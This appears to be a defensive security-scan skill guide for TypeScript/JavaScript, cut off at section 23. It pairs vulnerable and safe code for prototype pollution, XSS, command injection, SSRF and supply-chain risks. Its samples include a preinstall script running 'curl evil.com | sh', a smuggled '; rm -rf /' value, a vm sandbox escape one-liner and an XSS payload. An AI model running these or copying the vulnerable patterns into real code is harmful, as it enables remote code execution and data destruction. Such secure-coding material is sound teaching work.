---
name: sc-lang-typescript
description: TypeScript/JavaScript-specific security deep scan
license: MIT
metadata:
  author: ersinkoc
  category: security
  version: "1.0.0"
---

# SC: TypeScript/JavaScript Security Deep Scan

## Purpose

Detects TypeScript/JavaScript-specific security anti-patterns and language-idiomatic attack vectors across both browser and Node.js environments. This skill covers frontend frameworks (React, Next.js, Angular, Vue), backend frameworks (Express, Fastify, Koa, Nest), ORMs (Prisma, Drizzle, TypeORM, Sequelize), and the broader npm ecosystem.

## Activation

Activates when TypeScript or JavaScript is detected in the project. Detection signals include:
- Files with `.ts`, `.tsx`, `.js`, `.jsx`, `.mjs`, `.cjs` extensions
- `package.json`, `tsconfig.json`, `deno.json`, or `bun.lockb` presence
- Node.js runtime markers (`process.env`, `require()`, `import`)

## Checklist Reference

References `checklists/typescript-security-checklist.md`.

## TypeScript/JavaScript-Specific Vulnerability Patterns

---

### 1. Prototype Pollution

**Description:** Attackers inject properties into `Object.prototype` via `__proto__`, `constructor.prototype`, or recursive merge functions, poisoning every object in the runtime.

**Dangerous Functions / Patterns:**
- `obj[key] = value` where `key` is user-controlled
- Recursive `deepMerge`, `_.merge`, `_.defaultsDeep` with untrusted input
- `JSON.parse()` of untrusted input followed by object spread or merge
- Direct access to `__proto__` or `constructor.prototype`

**Safe Alternative:**
- Use `Object.create(null)` for lookup maps
- Validate keys against a denylist: `__proto__`, `constructor`, `prototype`
- Use `Map` instead of plain objects for user-keyed data
- Freeze prototypes with `Object.freeze(Object.prototype)` in sensitive contexts

**Vulnerable Code:**
```typescript
function deepMerge(target: any, source: any) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = deepMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key]; // __proto__.isAdmin = true
    }
  }
  return target;
}
deepMerge({}, JSON.parse(userInput));
```

**Safe Code:**
```typescript
function safeMerge(target: Record<string, unknown>, source: Record<string, unknown>) {
  const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
  for (const key of Object.keys(source)) {
    if (FORBIDDEN.has(key)) continue;
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      target[key] = safeMerge(
        (target[key] as Record<string, unknown>) ?? Object.create(null),
        source[key] as Record<string, unknown>
      );
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

---

### 2. eval() / Function() / setTimeout(string) Injection

**Description:** Dynamic code execution functions compile and run arbitrary strings, enabling full remote code execution when input is attacker-controlled.

**Dangerous Functions / Patterns:**
- `eval(userInput)`
- `new Function('return ' + userInput)()`
- `setTimeout(userInput, 1000)` and `setInterval(userInput, 1000)` with string arguments
- Template literal interpolation into eval

**Safe Alternative:**
- Use `JSON.parse()` for data deserialization
- Use a sandboxed expression parser (e.g., `expr-eval`, `mathjs` with sandbox)
- Always pass function references to `setTimeout`/`setInterval`, never strings
- Use a strict CSP with `script-src` that blocks `unsafe-eval`

**Vulnerable Code:**
```typescript
// User-supplied math expression
app.post('/calc', (req, res) => {
  const result = eval(req.body.expression); // RCE
  res.json({ result });
});
```

**Safe Code:**
```typescript
import { Parser } from 'expr-eval';

const parser = new Parser();
app.post('/calc', (req, res) => {
  try {
    const expr = parser.parse(req.body.expression);
    const result = expr.evaluate({});
    res.json({ result });
  } catch {
    res.status(400).json({ error: 'Invalid expression' });
  }
});
```

---

### 3. DOM-Based XSS

**Description:** Client-side JavaScript writes unsanitized user input directly into the DOM, enabling script injection without server involvement.

**Dangerous Functions / Patterns:**
- `element.innerHTML = userInput`
- `document.write(userInput)`
- `document.writeln(userInput)`
- `$(selector).html(userInput)` (jQuery)
- `$(userInput)` (jQuery selector injection)
- `element.outerHTML = userInput`
- `element.insertAdjacentHTML('beforeend', userInput)`

**Safe Alternative:**
- Use `element.textContent = userInput` for text
- Use `DOMPurify.sanitize(userInput)` before inserting HTML
- Use framework templating (React JSX, Angular templates) which auto-escape
- Use the Trusted Types API to enforce sanitization

**Vulnerable Code:**
```typescript
const searchTerm = new URLSearchParams(location.search).get('q');
document.getElementById('results')!.innerHTML =
  `<h2>Results for: ${searchTerm}</h2>`; // XSS via ?q=<img onerror=alert(1) src=x>
```

**Safe Code:**
```typescript
import DOMPurify from 'dompurify';

const searchTerm = new URLSearchParams(location.search).get('q') ?? '';
const heading = document.createElement('h2');
heading.textContent = `Results for: ${searchTerm}`;
document.getElementById('results')!.replaceChildren(heading);
```

---

### 4. Node.js child_process Command Injection

**Description:** Spawning shell commands with user-controlled arguments enables arbitrary command execution on the server.

**Dangerous Functions / Patterns:**
- `exec(userInput)` or `exec('cmd ' + userInput)`
- `execSync('grep ' + pattern)`
- `spawn('sh', ['-c', userInput])`
- Template literals in shell commands

**Safe Alternative:**
- Use `execFile()` or `spawn()` with argument arrays (no shell)
- Validate arguments against allowlists
- Use `shell: false` (the default for `spawn`)
- Use libraries like `execa` with explicit argument arrays

**Vulnerable Code:**
```typescript
import { exec } from 'child_process';

app.get('/lookup', (req, res) => {
  exec(`nslookup ${req.query.domain}`, (err, stdout) => {
    res.send(stdout); // ; rm -rf / via domain parameter
  });
});
```

**Safe Code:**
```typescript
import { execFile } from 'child_process';

app.get('/lookup', (req, res) => {
  const domain = req.query.domain as string;
  if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
    return res.status(400).send('Invalid domain');
  }
  execFile('nslookup', [domain], (err, stdout) => {
    res.send(stdout);
  });
});
```

---

### 5. vm Module Sandbox Escape

**Description:** Node.js `vm` module does not provide a security boundary. Attackers can escape the sandbox via prototype chain traversal to access the host `process` object and execute arbitrary code.

**Dangerous Functions / Patterns:**
- `vm.runInNewContext(userCode)`
- `vm.createContext()` with host object leakage
- `vm.Script` executing untrusted code
- Any use of `vm` or `vm2` for security sandboxing (vm2 has known escapes)

**Safe Alternative:**
- Use `isolated-vm` for true V8 isolate sandboxing
- Use Web Workers with restricted permissions
- Use Deno with `--allow-*` permission flags
- Use Cloudflare Workers or other process-isolated runtimes
- Never rely on `vm` or `vm2` for untrusted code execution

**Vulnerable Code:**
```typescript
import vm from 'vm';

const sandbox = { result: null };
vm.createContext(sandbox);
vm.runInNewContext(userCode, sandbox);
// Escape: this.constructor.constructor('return process')().exit()
```

**Safe Code:**
```typescript
import ivm from 'isolated-vm';

const isolate = new ivm.Isolate({ memoryLimit: 128 });
const context = await isolate.createContext();
const script = await isolate.compileScript(userCode);
const result = await script.run(context, { timeout: 1000 });
isolate.dispose();
```

---

### 6. require() Hijacking and Dynamic Import Abuse

**Description:** Dynamic `require()` or `import()` with user-controlled paths allows loading arbitrary modules from disk or node_modules, potentially executing malicious code.

**Dangerous Functions / Patterns:**
- `require(userInput)`
- `import(userInput)`
- `require('./plugins/' + pluginName)` without validation
- `require.resolve(userInput)` for path probing

**Safe Alternative:**
- Use a static allowlist of permitted modules
- Validate module names against a strict pattern (alphanumeric only)
- Use a plugin registry pattern with pre-registered handlers
- Avoid exposing module loading paths to user input

**Vulnerable Code:**
```typescript
app.get('/plugin/:name', (req, res) => {
  const plugin = require(`./plugins/${req.params.name}`);
  // ../../etc/passwd or arbitrary module load
  res.json(plugin.execute());
});
```

**Safe Code:**
```typescript
const ALLOWED_PLUGINS = new Map<string, Plugin>([
  ['markdown', markdownPlugin],
  ['csv', csvPlugin],
  ['json', jsonPlugin],
]);

app.get('/plugin/:name', (req, res) => {
  const plugin = ALLOWED_PLUGINS.get(req.params.name);
  if (!plugin) return res.status(404).json({ error: 'Unknown plugin' });
  res.json(plugin.execute());
});
```

---

### 7. Express/Fastify Middleware Ordering Vulnerabilities

**Description:** Incorrect middleware ordering can bypass authentication, rate limiting, input validation, or security headers. Middleware executes in registration order, so placing auth after route handlers leaves routes unprotected.

**Dangerous Functions / Patterns:**
- Auth middleware registered after route handlers
- `helmet()` or CORS middleware placed after routes
- Error handler not registered last
- Rate limiter placed after expensive operations
- Body parser size limits missing or placed incorrectly
- `app.use()` ordering that leaves gaps

**Safe Alternative:**
- Register security middleware first: helmet, CORS, rate limiter, body parser
- Register auth middleware before protected routes
- Register error handlers last
- Use route-level middleware for fine-grained control
- Audit middleware order in integration tests

**Vulnerable Code:**
```typescript
const app = express();

// Routes registered BEFORE auth middleware
app.get('/api/admin/users', adminController.listUsers);
app.post('/api/admin/delete', adminController.deleteUser);

// Auth middleware registered too late - above routes are unprotected
app.use(authMiddleware);
app.use(helmet());
```

**Safe Code:**
```typescript
const app = express();

// Security middleware first
app.use(helmet());
app.use(cors(corsOptions));
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
app.use(express.json({ limit: '1mb' }));

// Auth before protected routes
app.use('/api/admin', authMiddleware, adminRouter);
app.use(errorHandler); // Error handler last
```

---

### 8. npm Supply Chain Attacks

**Description:** Malicious packages can enter the dependency tree via typosquatting, compromised maintainer accounts, postinstall scripts, or lockfile manipulation.

**Dangerous Functions / Patterns:**
- Installing packages with similar names to popular ones (e.g., `lodahs` vs `lodash`)
- `"postinstall"`, `"preinstall"`, `"prepare"` scripts in dependencies
- Missing or modified `package-lock.json` / `pnpm-lock.yaml`
- `"dependencies"` including packages that should be `"devDependencies"`
- Unpinned dependency versions (`*`, `>=`, or overly broad ranges)
- Lockfile entries with unexpected `resolved` URLs or `integrity` hashes

**Safe Alternative:**
- Use `npm audit` and `pnpm audit` regularly
- Enable `--ignore-scripts` during CI installs, run scripts explicitly
- Pin exact versions or use lockfiles committed to source control
- Use Socket.dev, Snyk, or similar SCA tools
- Review new dependencies before adding them
- Use `npm config set ignore-scripts true` as a default

**Vulnerable Code (package.json):**
```json
{
  "dependencies": {
    "lodash": "*",
    "colores": "^1.0.0",
    "event-stream": "^3.3.0"
  },
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
```

**Safe Code (package.json):**
```json
{
  "dependencies": {
    "lodash": "4.17.21",
    "chalk": "5.3.0"
  },
  "scripts": {
    "prepare": "husky"
  },
  "overrides": {
    "optionalDependencies": {}
  }
}
```

---

### 9. JWT Client-Side Storage Vulnerabilities

**Description:** Storing JWTs in `localStorage` or `sessionStorage` exposes them to XSS theft. Storing secrets or sensitive claims in JWT payload exposes them to any holder since JWTs are base64-encoded, not encrypted.

**Dangerous Functions / Patterns:**
- `localStorage.setItem('token', jwt)`
- `sessionStorage.setItem('token', jwt)`
- JWTs in URL parameters or query strings
- Storing sensitive data (roles, PII) in JWT payload without encryption
- Using `alg: 'none'` or allowing algorithm switching
- Not validating `iss`, `aud`, `exp` claims

**Safe Alternative:**
- Store JWTs in `httpOnly`, `secure`, `sameSite` cookies
- Use short-lived access tokens with refresh token rotation
- Validate all claims server-side (`iss`, `aud`, `exp`, `nbf`)
- Pin the expected algorithm server-side
- Use opaque tokens with server-side session lookup for sensitive contexts

**Vulnerable Code:**
```typescript
// Client
const response = await fetch('/api/login', { method: 'POST', body });
const { token } = await response.json();
localStorage.setItem('authToken', token); // Accessible to any XSS payload

// Server
const token = jwt.sign(payload, secret); // No algorithm pinning
const decoded = jwt.verify(req.headers.authorization, secret);
// Algorithm confusion possible
```

**Safe Code:**
```typescript
// Server: Set JWT as httpOnly cookie
const token = jwt.sign(payload, secret, {
  algorithm: 'RS256',
  expiresIn: '15m',
  issuer: 'myapp',
  audience: 'myapp-api',
});
res.cookie('access_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000,
});

// Server: Verify with pinned algorithm
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  issuer: 'myapp',
  audience: 'myapp-api',
});
```

---

### 10. TypeScript `as any` and @ts-ignore Security Bypass

**Description:** TypeScript type safety annotations that suppress errors (`as any`, `@ts-ignore`, `@ts-expect-error`, non-null assertions `!`) can mask security-critical type mismatches, allowing unsafe data to flow through the application unchecked.

**Dangerous Functions / Patterns:**
- `userInput as any` to bypass validation types
- `// @ts-ignore` above security-critical code
- `// @ts-expect-error` to silence type errors in auth/authz logic
- Non-null assertion `user!.isAdmin` without actual null check
- `as unknown as TargetType` double assertion to force incompatible types
- Disabling `strict` in `tsconfig.json`

**Safe Alternative:**
- Use Zod, Valibot, or io-ts for runtime validation at boundaries
- Enable `strict: true` in tsconfig.json
- Use ESLint rules: `@typescript-eslint/no-explicit-any`, `@typescript-eslint/no-non-null-assertion`
- Replace `as any` with proper type narrowing or type guards
- Treat `@ts-ignore` in security-critical paths as high-severity findings

**Vulnerable Code:**
```typescript
function processUser(input: unknown) {
  // @ts-ignore
  const user = input as any;
  if (user.role === 'admin') { // No runtime validation
    deleteAllRecords(); // Could be triggered by crafted input
  }
}
```

**Safe Code:**
```typescript
import { z } from 'zod';

const UserSchema = z.object({
  id: z.string().uuid(),
  role: z.enum(['user', 'moderator', 'admin']),
  email: z.string().email(),
});

function processUser(input: unknown) {
  const result = UserSchema.safeParse(input);
  if (!result.success) {
    throw new ValidationError(result.error);
  }
  const user = result.data; // Fully typed, runtime-validated
  if (user.role === 'admin') {
    deleteAllRecords();
  }
}
```

---

### 11. React dangerouslySetInnerHTML and SSR Injection

**Description:** React's `dangerouslySetInnerHTML` bypasses built-in XSS protection. In SSR contexts, unsanitized user data rendered into HTML can execute on every visitor's browser.

**Dangerous Functions / Patterns:**
- `<div dangerouslySetInnerHTML={{ __html: userInput }} />`
- String concatenation in SSR HTML templates
- Rendering user data into `<script>` tags for hydration
- `renderToString()` with unsanitized props
- `href="javascript:..."` in JSX (React does not block this in all versions)

**Safe Alternative:**
- Use a sanitizer like DOMPurify before `dangerouslySetInnerHTML`
- Use `textContent`-equivalent patterns (React auto-escapes JSX expressions)
- For SSR hydration data, use `JSON.stringify()` with a replacer that escapes `</script>`
- Validate and sanitize URLs before rendering in `href` or `src`

**Vulnerable Code:**
```tsx
function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}

// SSR hydration - userData can break out of script tag
const html = `<script>window.__DATA__ = ${JSON.stringify(userData)};</script>`;
```

**Safe Code:**
```tsx
import DOMPurify from 'isomorphic-dompurify';

function Comment({ body }: { body: string }) {
  const clean = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// SSR hydration - escape closing script tags
function serializeForScript(data: unknown): string {
  return JSON.stringify(data).replace(/</g, '\\u003c');
}
const html = `<script>window.__DATA__ = ${serializeForScript(userData)};</script>`;
```

---

### 12. Next.js Server Action Injection, Middleware Bypass, and ISR Cache Poisoning

**Description:** Next.js introduces server-specific attack surfaces: Server Actions receive untrusted client input, middleware can be bypassed with path manipulation, and ISR/SSG cache can be poisoned to serve malicious content to all users.

**Dangerous Functions / Patterns:**
- Server Actions without input validation (form data is fully attacker-controlled)
- Middleware matching on paths vulnerable to `..` or encoded traversal
- ISR `revalidateTag()` / `revalidatePath()` exposed without authentication
- `headers()` and `cookies()` in Server Components used without validation
- `redirect()` with user-controlled destinations (open redirect)
- `unstable_cache()` keyed on user-controlled values

**Safe Alternative:**
- Validate all Server Action inputs with Zod schemas
- Use middleware matchers carefully and test edge cases with encoded paths
- Protect revalidation endpoints with secret tokens
- Validate redirect targets against an allowlist of domains/paths
- Never trust headers or cookies without validation in Server Components

**Vulnerable Code:**
```typescript
// app/actions.ts
'use server';

export async function updateProfile(formData: FormData) {
  const role = formData.get('role') as string;
  // User can submit role=admin
  await db.user.update({ where: { id: session.userId }, data: { role } });
}

// middleware.ts
export function middleware(request: NextRequest) {
  // Bypassable with /_next/.. path encoding tricks
  if (request.nextUrl.pathname.startsWith('/admin')) {
    return checkAuth(request);
  }
}
```

**Safe Code:**
```typescript
// app/actions.ts
'use server';
import { z } from 'zod';

const UpdateProfileSchema = z.object({
  displayName: z.string().min(1).max(100),
  bio: z.string().max(500).optional(),
  // role is NOT accepted from client input
});

export async function updateProfile(formData: FormData) {
  const session = await getServerSession();
  if (!session) throw new Error('Unauthorized');

  const input = UpdateProfileSchema.parse({
    displayName: formData.get('displayName'),
    bio: formData.get('bio'),
  });

  await db.user.update({ where: { id: session.userId }, data: input });
}

// middleware.ts - use matcher config for reliable matching
export const config = {
  matcher: ['/admin/:path*', '/api/admin/:path*'],
};
```

---

### 13. Prisma/Drizzle ORM Raw Query Injection

**Description:** ORMs provide safe query builders, but raw query methods bypass parameterization when developers interpolate strings directly.

**Dangerous Functions / Patterns:**
- Prisma: `prisma.$queryRawUnsafe()` with string concatenation
- Drizzle: `sql.raw(userInput)` inside query builders
- TypeORM: `query('SELECT ... ' + userInput)`
- Sequelize: `sequelize.query('SELECT ... ' + userInput)`
- Knex: `knex.raw(userInput)` without bindings

**Safe Alternative:**
- Prisma: Use `Prisma.sql` tagged template for auto-parameterization
- Drizzle: Use `sql.placeholder()` or the query builder
- Use parameterized queries with binding arrays
- Avoid `$queryRawUnsafe` and `sql.raw()` entirely with user input

**Vulnerable Code:**
```typescript
// Prisma
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${req.query.email}'`
);

// Drizzle
const result = await db.execute(
  sql`SELECT * FROM users WHERE name = ${sql.raw(req.query.name)}`
);
```

**Safe Code:**
```typescript
// Prisma - tagged template auto-parameterizes
const users = await prisma.$queryRaw(
  Prisma.sql`SELECT * FROM users WHERE email = ${req.query.email}`
);

// Drizzle - use query builder
const result = await db.select()
  .from(users)
  .where(eq(users.name, req.query.name));
```

---

### 14. WebSocket XSS and postMessage Origin Bypass

**Description:** WebSocket messages and `postMessage` events are often trusted without origin validation, enabling cross-origin script injection and data exfiltration.

**Dangerous Functions / Patterns:**
- `ws.on('message', (data) => element.innerHTML = data)`
- `window.addEventListener('message', (e) => { /* no origin check */ })`
- `postMessage(data, '*')` broadcasting to any origin
- WebSocket servers without origin header validation
- Deserializing WebSocket messages with `JSON.parse` without schema validation

**Safe Alternative:**
- Always validate `event.origin` in `message` event handlers
- Use specific target origins in `postMessage(data, 'https://trusted.com')`
- Validate and sanitize WebSocket message payloads with schemas
- Check `Origin` header on WebSocket upgrade requests server-side
- Never insert WebSocket data into DOM without sanitization

**Vulnerable Code:**
```typescript
// Client: No origin check
window.addEventListener('message', (event) => {
  document.getElementById('output')!.innerHTML = event.data.html;
  // XSS from any origin
});

// Server: No origin validation on upgrade
wss.on('connection', (ws, req) => {
  ws.on('message', (data) => {
    broadcast(data.toString()); // Relays unvalidated content
  });
});
```

**Safe Code:**
```typescript
// Client: Strict origin check
const TRUSTED_ORIGINS = new Set([
  'https://app.example.com',
  'https://widget.example.com',
]);

window.addEventListener('message', (event) => {
  if (!TRUSTED_ORIGINS.has(event.origin)) return;
  const parsed = MessageSchema.safeParse(event.data);
  if (!parsed.success) return;
  document.getElementById('output')!.textContent = parsed.data.text;
});

// Server: Validate origin on upgrade
wss.on('headers', (headers, req) => {
  const origin = req.headers.origin;
  if (!TRUSTED_ORIGINS.has(origin)) {
    req.destroy();
  }
});
```

---

### 15. Regular Expression Denial of Service (ReDoS)

**Description:** Regex patterns with nested quantifiers or overlapping alternation cause catastrophic backtracking when matched against crafted input, freezing the event loop.

**Dangerous Functions / Patterns:**
- Patterns like `(a+)+`, `(a|a)+`, `(.*a){10}`
- User-supplied regex via `new RegExp(userInput)`
- Email/URL validation regex with nested groups
- Regex used in hot paths (middleware, request parsing)
- `String.prototype.match()`, `.replace()`, `.search()` with vulnerable patterns

**Safe Alternative:**
- Use `re2` (Google's RE2 engine) which guarantees linear time
- Use the `safe-regex` or `regexp-tree` libraries to lint patterns
- Set timeouts on regex execution with `node:vm` or worker threads
- Prefer simple, non-nested patterns or use dedicated parsers
- Validate input length before applying regex

**Vulnerable Code:**
```typescript
// Catastrophic backtracking with nested quantifiers
const emailRegex = /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;

app.post('/subscribe', (req, res) => {
  if (emailRegex.test(req.body.email)) { // Hangs on crafted input
    subscribe(req.body.email);
  }
});

// User-controlled regex
const pattern = new RegExp(req.query.filter); // ReDoS + regex injection
```

**Safe Code:**
```typescript
import RE2 from 're2';

const emailRegex = new RE2(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);

app.post('/subscribe', (req, res) => {
  const email = String(req.body.email);
  if (email.length > 254) return res.status(400).send('Invalid email');
  if (emailRegex.test(email)) {
    subscribe(email);
  }
});

// Never allow user-controlled regex - use substring matching instead
function matchFilter(input: string, filter: string): boolean {
  return input.includes(filter); // Simple substring, no backtracking
}
```

---

### 16. Path Traversal via path.join / path.resolve

**Description:** `path.join()` and `path.resolve()` resolve `..` segments, allowing attackers to escape intended directories when user input is included in file paths.

**Dangerous Functions / Patterns:**
- `path.join(uploadsDir, userFilename)` where filename contains `../../`
- `path.resolve(baseDir, req.params.file)`
- `fs.readFile(baseDir + '/' + userInput)`
- URL-decoded path components bypassing naive `..` checks
- Null byte injection (`%00`) in older Node.js versions

**Safe Alternative:**
- Resolve the full path and verify it starts with the intended base directory
- Use `path.basename()` to strip directory components from filenames
- Reject paths containing `..`, `~`, or null bytes
- Use a chroot-like validation function

**Vulnerable Code:**
```typescript
app.get('/files/:name', (req, res) => {
  const filePath = path.join('/app/uploads', req.params.name);
  res.sendFile(filePath); // ../../etc/passwd escapes uploads dir
});
```

**Safe Code:**
```typescript
app.get('/files/:name', (req, res) => {
  const baseDir = path.resolve('/app/uploads');
  const filePath = path.resolve(baseDir, req.params.name);

  // Ensure resolved path is still within base directory
  if (!filePath.startsWith(baseDir + path.sep)) {
    return res.status(400).send('Invalid path');
  }

  res.sendFile(filePath);
});
```

---

### 17. Insecure Randomness (Math.random)

**Description:** `Math.random()` uses a PRNG that is not cryptographically secure. Using it for tokens, session IDs, OTPs, or any security-sensitive value makes them predictable.

**Dangerous Functions / Patterns:**
- `Math.random().toString(36)` for tokens or IDs
- `Math.floor(Math.random() * max)` for OTP generation
- Custom shuffle/selection using `Math.random()` for security purposes
- Third-party libraries using `Math.random()` internally

**Safe Alternative:**
- Use `crypto.randomBytes()` or `crypto.randomUUID()` in Node.js
- Use `crypto.getRandomValues()` in browsers
- Use `nanoid` or `uuid` libraries that use cryptographic randomness
- Use `crypto.randomInt()` for secure random integers

**Vulnerable Code:**
```typescript
function generateToken(): string {
  return Math.random().toString(36).substring(2); // Predictable
}

function generateOTP(): string {
  return String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
}
```

**Safe Code:**
```typescript
import crypto from 'node:crypto';

function generateToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

function generateOTP(): string {
  return String(crypto.randomInt(0, 1000000)).padStart(6, '0');
}
```

---

### 18. CORS Misconfiguration in Express/Fastify

**Description:** Overly permissive CORS configurations allow malicious websites to make authenticated cross-origin requests, exfiltrate data, or perform actions on behalf of the user.

**Dangerous Functions / Patterns:**
- `origin: '*'` combined with `credentials: true`
- Reflecting `req.headers.origin` directly as `Access-Control-Allow-Origin`
- Regex-based origin matching with bypasses
- Missing CORS configuration (defaults to no restriction on simple requests)
- `Access-Control-Allow-Methods: *` exposing all methods

**Safe Alternative:**
- Maintain an explicit allowlist of permitted origins
- Never reflect the Origin header without validation
- Use exact string matching, not substring or regex
- Only allow necessary methods and headers
- Test CORS configuration with tools like `curl` from different origins

**Vulnerable Code:**
```typescript
app.use(cors({
  origin: (origin, callback) => {
    // Bypassable: attacker uses "notexample.com"
    if (origin?.includes('example.com')) {
      callback(null, true);
    } else {
      callback(null, false);
    }
  },
  credentials: true,
}));
```

**Safe Code:**
```typescript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

---

### 19. Server-Side Fetch SSRF

**Description:** Server-side HTTP requests (`fetch`, `axios`, `got`, `http.request`) with user-controlled URLs allow attackers to probe internal networks, access cloud metadata endpoints, or exfiltrate data.

**Dangerous Functions / Patterns:**
- `fetch(req.body.url)` with arbitrary user URLs
- `axios.get(userUrl)` forwarding internal service responses
- Following redirects to internal IPs (127.0.0.1, 169.254.169.254, etc.)
- DNS rebinding attacks bypassing hostname validation
- URL parsing inconsistencies between validation and request libraries

**Safe Alternative:**
- Validate URLs against an allowlist of permitted hostnames/domains
- Block private/reserved IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 169.254.0.0/16)
- Resolve DNS before making the request and validate the resolved IP
- Disable redirect following or re-validate after each redirect
- Use an HTTP proxy that enforces network policies

**Vulnerable Code:**
```typescript
app.post('/api/preview', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url); // SSRF
  const html = await response.text();
  res.json({ preview: extractMetadata(html) });
});
```

**Safe Code:**
```typescript
import { URL } from 'node:url';
import dns from 'node:dns/promises';

const BLOCKED_RANGES = [
  /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./, /^169\.254\./, /^0\./, /^::1$/,
];

async function isSafeUrl(urlStr: string): Promise<boolean> {
  const parsed = new URL(urlStr);
  if (!['http:', 'https:'].includes(parsed.protocol)) return false;
  const { address } = await dns.lookup(parsed.hostname);
  return !BLOCKED_RANGES.some((r) => r.test(address));
}

app.post('/api/preview', async (req, res) => {
  const { url } = req.body;
  if (!await isSafeUrl(url)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  const response = await fetch(url, { redirect: 'error' });
  const html = await response.text();
  res.json({ preview: extractMetadata(html) });
});
```

---

### 20. Package.json Script Injection

**Description:** npm/pnpm lifecycle scripts (`preinstall`, `postinstall`, `prepare`, `prepublishOnly`) execute arbitrary commands during `npm install`. Malicious or compromised packages can use these to execute code on developer machines and CI systems.

**Dangerous Functions / Patterns:**
- `"preinstall"` scripts in dependency packages that download remote payloads
- `"postinstall": "node ./setup.js"` that downloads and executes remote code
- Lifecycle scripts that modify `.bashrc`, `.npmrc`, or other config files
- Build scripts that execute dynamically constructed shell commands

**Safe Alternative:**
- Run `npm install --ignore-scripts` and execute needed scripts explicitly
- Use `npm config set ignore-scripts true` as a global default
- Audit `package.json` scripts of new dependencies before installing
- Use `pinst` to disable postinstall in published packages
- Use `allowScripts` in `.npmrc` (npm v9+) to allowlist scripts per package
- Run installs in sandboxed CI environments with limited network access

**Vulnerable Code (malicious dependency):**
```json
{
  "name": "totally-legit-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"require('child_process').execSync('curl evil.com | sh')\"",
    "postinstall": "node ./scripts/setup.js"
  }
}
```

**Safe Code (.npmrc):**
```ini
ignore-scripts=true
audit=true
fund=false
```

```json
{
  "scripts": {
    "prepare": "husky",
    "postinstall:manual": "prisma generate && patch-package"
  }
}
```

---

### 21. Timing Attacks on String Comparison

**Description:** Using `===` or `==` to compare secrets (API keys, tokens, HMAC digests) leaks information through timing differences, as the comparison short-circuits on the first mismatched character.

**Dangerous Functions / Patterns:**
- `if (token === expectedToken)` for authentication tokens
- `if (hmac === computedHmac)` for webhook signature verification
- Password hash comparison with string equality

**Safe Alternative:**
- Use `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))`
- Ensure both buffers are the same length before comparison
- Use `scrypt` or `argon2` for password verification (they handle timing internally)

**Vulnerable Code:**
```typescript
app.post('/api/webhook', (req, res) => {
  const signature = req.headers['x-webhook-signature'] as string;
  const expected = computeHmac(req.body);
  if (signature === expected) { // Timing leak
    processWebhook(req.body);
  }
});
```

**Safe Code:**
```typescript
import crypto from 'node:crypto';

app.post('/api/webhook', (req, res) => {
  const signature = req.headers['x-webhook-signature'] as string;
  const expected = computeHmac(req.body);

  const sigBuf = Buffer.from(signature, 'hex');
  const expBuf = Buffer.from(expected, 'hex');

  if (sigBuf.length !== expBuf.length ||
      !crypto.timingSafeEqual(sigBuf, expBuf)) {
    return res.status(401).send('Invalid signature');
  }
  processWebhook(req.body);
});
```

---

### 22. Unhandled Promise Rejection and Error Leakage

**Description:** Unhandled promise rejections can crash Node.js processes (default behavior in Node 15+). Detailed error messages leaked to clients expose internal paths, stack traces, and database schema information.

**Dangerous Functions / Patterns:**
- Missing `.catch()` on promises in request handlers
- `async` Express handlers without error-catching wrapper
- `res.status(500).json({ error: err.message, stack: err.stack })`
- Prisma/Sequelize errors returned verbatim to clients
- Unhandled `'unhandledRejection'` events

**Safe Alternative:**
- Use async wrapper middleware for Express
- Implement a global error handler that sanitizes error responses
- Log full errors server-side, return generic messages to clients
- Set `process.on('unhandledRejection', handler)` for graceful shutdown

**Vulnerable Code:**
```typescript
app.get('/api/user/:id', async (req, res) => {
  // No try/catch: unhandled rejection if DB fails
  const user = await prisma.user.findUniqueOrThrow({
    where: { id: req.params.id },
  });
  res.json(user);
});

// Error handler leaks internals
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});
```

**Safe Code:**
```typescript
const asyncHandler = (fn: RequestHandler): RequestHandler =>
  (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

app.get('/api/user/:id', asyncHandler(async (req, res) => {
  const user = await prisma.user.findUnique({
    where: { id: req.params.id },
  });
  if (!user) return res.status(404).json({ error: 'User not found' });
  res.json(user);
}));

// Error handler: log details, return generic message
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  logger.error({ err, method: req.method, path: req.path });
  res.status(500).json({ error: 'Internal server error' });
});
```

---

### 23. Environment Variable and Secrets Exposure

**Description:** Secrets hardcoded in source, committed `.env` files, or exposed via client-side bundles leak credentials. Next.js's `NEXT_PUBLIC_` prefix explicitly sends variables to the browser.

**Dangerous Functions / Patterns:**
